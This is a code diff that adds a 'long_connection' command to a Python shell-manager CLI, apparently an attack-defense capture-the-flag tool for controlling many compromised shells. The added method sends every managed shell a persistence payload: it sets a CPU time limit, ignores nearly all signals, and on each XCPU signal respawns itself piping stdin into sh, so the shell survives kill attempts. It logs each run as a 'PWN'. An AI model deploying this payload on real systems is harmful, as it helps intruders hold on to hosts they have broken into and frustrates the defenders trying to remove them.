@@ -132,6 +132,24 @@ class ShellManagerCli(Cmd):
             self.write(output + '\n')
             self.flag_queue.put(output.strip())
 
+    def do_long_connection(self, target):
+        target = target.strip()
+        if not target:
+            ios = self.shells.items()
+        else:
+            ios = self.get_ios(target)
+        for shell_name, io in ios:
+            self.write('[{}]\n'.format(shell_name))
+            command = "ulimit -S -t 1\nexport TRAPCMD=\"trap '' TERM ALRM QUIT ABRT HUP INT ILL FPE SEGV PIPE USR1 USR2 TSTP TTIN TTOU BUS PROF SYS TRAP VTALRM XFSZ IO PWR; trap 'times; exec 9<&0; ({ echo \$ TRAPCMD; cat <&9 ; } | sh &): exit' XCPU\"\neval $TRAPCMD\n"
+            logger.info("[+] PWN %s\n%s" % (shell_name, command))
+            try:
+                output = self.check_output(io, command)
+            except IOError:
+                self.write(
+                    "[-] {} Broken ... Removed\n".format(shell_name))
+                continue
+            self.write(output)
+
     def do_interact(self, target):
         target = target.strip()
         if not target:
